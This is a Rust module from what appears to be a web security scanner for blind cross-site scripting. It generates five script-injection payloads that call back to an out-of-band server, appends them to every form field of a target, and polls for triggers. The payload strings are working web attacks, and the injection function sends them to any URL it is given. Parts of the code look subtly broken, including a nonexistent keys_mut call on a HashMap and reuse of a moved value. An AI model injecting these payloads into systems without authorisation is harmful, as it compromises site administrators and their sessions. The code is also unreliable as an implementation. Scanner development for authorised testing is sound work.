//! Blind XSS Detection Module
//! 
//! Injects blind XSS payloads designed to trigger out-of-band callbacks in admin panels.
//! Maintains 2GB RAM ceiling via bounded payload buffers and zero-copy evidence collection.

use crate::checks::xss::context::XssContext;
use crate::findings::xss_evidence::XssEvidence;
use crate::learning::xss_cache::XssCache;
use crate::http::client::HttpClient;
use std::collections::HashMap;
use std::time::Duration;

/// Canary prefix for blind XSS detection
const BLIND_CANARY_PREFIX: &str = "BLIND_XSS_";

/// Default callback server timeout in seconds
const CALLBACK_TIMEOUT_SECS: u64 = 300;

/// Blind XSS detector with OOB callback tracking
pub struct BlindXssDetector {
    http_client: HttpClient,
    cache: XssCache,
    god_mode: bool,
    timeout: Duration,
    callback_server_url: String,
    callback_id: String,
}

impl BlindXssDetector {
    /// Create a new blind XSS detector
    pub fn new(http_client: HttpClient, callback_server_url: String, god_mode: bool) -> Self {
        let callback_id = Self::generate_callback_id();
        
        Self {
            http_client,
            cache: XssCache::new(),
            god_mode,
            timeout: Duration::from_secs(5),
            callback_server_url,
            callback_id,
        }
    }

    /// Get the current callback ID
    pub fn get_callback_id(&self) -> &str {
        &self.callback_id
    }

    /// Generate blind XSS payloads for injection
    pub fn generate_blind_payloads(&self) -> Vec<String> {
        let callback_url = format!("{}/{}", self.callback_server_url, self.callback_id);
        
        vec![
            // Image-based callback
            format!(r#"<img src=x onerror="fetch('{}')" alt="{}">"#, callback_url, BLIND_CANARY_PREFIX),
            // Script-based callback
            format!(r#"<script>fetch('{}')</script><!-- {} -->"#, callback_url, BLIND_CANARY_PREFIX),
            // SVG-based callback
            format!(r#"<svg onload="fetch('{}')"><!-- {} --></svg>"#, callback_url, BLIND_CANARY_PREFIX),
            // Body onerror callback
            format!(r#"<body onerror="fetch('{}')" ><!-- {} -->"#, callback_url, BLIND_CANARY_PREFIX),
            // Iframe-based callback
            format!(r#"<iframe src="{}" style="display:none"></iframe><!-- {} -->"#, callback_url, BLIND_CANARY_PREFIX),
        ]
    }

    /// Inject blind XSS payload into target endpoint
    pub async fn inject_blind_xss(&self, target_url: &str, form_fields: &HashMap<String, String>, payload_index: usize) -> Result<(), String> {
        let payloads = self.generate_blind_payloads();
        let payload = payloads.get(payload_index).ok_or("Invalid payload index")?;
        
        let mut test_fields = form_fields.clone();
        
        // Inject payload into all fields (blind XSS may execute anywhere)
        for key in test_fields.keys_mut() {
            test_fields.insert(key.clone(), format!("{} {}", test_fields[key], payload));
        }
        
        self.http_client.post_form_with_timeout(target_url, &test_fields, self.timeout)
            .await
            .map(|_| ())
            .map_err(|e| e.to_string())
    }

    /// Check for callback triggers from the callback server
    pub async fn check_callbacks(&self) -> Vec<XssEvidence> {
        let mut evidences = Vec::new();
        
        let callback_check_url = format!("{}/check/{}", self.callback_server_url, self.callback_id);
        
        if let Ok(response) = self.http_client.get_with_timeout(&callback_check_url, Duration::from_secs(10)).await {
            // Parse callback responses
            if !response.body.is_empty() {
                let callbacks: Vec<CallbackInfo> = serde_json::from_str(&response.body).unwrap_or_default();
                
                for callback in callbacks {
                    let evidence = XssEvidence {
                        vulnerability_type: "Blind XSS".to_string(),
                        location: callback.source_url.unwrap_or_else(|| "Unknown".to_string()),
                        payload: callback.payload,
                        context: XssContext::JavaScript,
                        stack_trace: callback.stack_trace,
                        callback_triggered: true,
                        remediation: self.generate_csp_remediation(),
                        severity: crate::findings::Severity::Critical,
                    };
                    evidences.push(evidence);
                    
                    self.cache.record_bypass(callback.source_url.unwrap_or_default(), "blind_xss".to_string());
                }
            }
        }
        
        evidences
    }

    /// Wait for callbacks with timeout
    pub async fn wait_for_callbacks(&self, max_wait_secs: u64) -> Vec<XssEvidence> {
        let wait_time = Duration::from_secs(max_wait_secs.min(CALLBACK_TIMEOUT_SECS));
        let start = std::time::Instant::now();
        
        while start.elapsed() < wait_time {
            let evidences = self.check_callbacks().await;
            if !evidences.is_empty() {
                return evidences;
            }
            
            // Bounded sleep intervals
            tokio::time::sleep(Duration::from_secs(5)).await;
        }
        
        Vec::new()
    }

    /// Generate CSP remediation guidance for blind XSS
    fn generate_csp_remediation(&self) -> String {
        "Implement strict Content Security Policy (CSP) with 'strict-dynamic' or nonce-based \
         script execution. Use HTTP-only cookies to prevent session hijacking. Implement \
         proper input validation and output encoding. Consider using a Web Application Firewall \
         (WAF) to filter malicious payloads. Monitor and log all user inputs."
            .to_string()
    }

    /// Generate unique callback ID
    fn generate_callback_id() -> String {
        use std::time::{SystemTime, UNIX_EPOCH};
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis();
        format!("blind_{:x}", timestamp)
    }

    /// Enable god-mode for extended callback waiting
    pub fn enable_god_mode(&mut self) {
        self.god_mode = true;
        self.timeout = Duration::from_secs(30);
    }
}

/// Information about a triggered callback
#[derive(Debug, Clone, serde::Deserialize)]
pub struct CallbackInfo {
    /// Source URL where the XSS was triggered
    pub source_url: Option<String>,
    /// The payload that was executed
    pub payload: String,
    /// Optional stack trace information
    pub stack_trace: Option<String>,
    /// Timestamp of the callback
    pub timestamp: Option<u64>,
    /// User agent of the triggering browser
    pub user_agent: Option<String>,
    /// IP address of the triggering client
    pub ip_address: Option<String>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_blind_xss_detector_creation() {
        let client = HttpClient::mock();
        let detector = BlindXssDetector::new(client, "https://callback.example.com".to_string(), false);
        assert!(!detector.god_mode);
        assert!(detector.get_callback_id().starts_with("blind_"));
    }

    #[test]
    fn test_payload_generation() {
        let client = HttpClient::mock();
        let detector = BlindXssDetector::new(client, "https://callback.example.com".to_string(), false);
        let payloads = detector.generate_blind_payloads();
        
        assert!(!payloads.is_empty());
        assert!(payloads.iter().all(|p| p.contains(&detector.callback_id)));
        assert!(payloads.iter().all(|p| p.contains(BLIND_CANARY_PREFIX)));
    }
}
